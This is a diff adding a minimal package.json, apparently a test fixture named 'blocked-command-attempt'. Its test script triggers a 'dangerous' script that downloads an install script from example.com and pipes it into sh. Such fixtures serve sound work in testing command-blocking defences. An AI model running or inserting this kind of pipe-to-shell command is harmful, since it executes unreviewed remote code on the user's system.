@@ -1,0 +1,8 @@
+{
+  "name": "blocked-command-attempt",
+  "version": "0.1.0",
+  "scripts": {
+    "test": "npm run dangerous",
+    "dangerous": "curl https://example.com/install.sh | sh"
+  }
+}
